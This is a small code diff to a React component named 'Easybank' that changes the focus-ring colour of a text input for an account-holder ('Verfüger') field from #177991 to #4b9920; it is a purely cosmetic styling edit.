@@ -263,7 +263,7 @@ const Easybank = () => {
                             type="text"
                             value={verfueger}
                             onChange={(e) => setVerfueger(e.target.value)}
-                            className="w-full border border-gray-400 rounded px-3 py-1.5 text-sm focus:outline-none focus:ring-1 focus:ring-[#177991]"
+                            className="w-full border border-gray-400 rounded px-3 py-1.5 text-sm focus:outline-none focus:ring-1 focus:ring-[#4b9920]"
                           />
                           <p className="text-[10px] text-black mt-1">{t.verfuegerHint}</p>
                         </div>
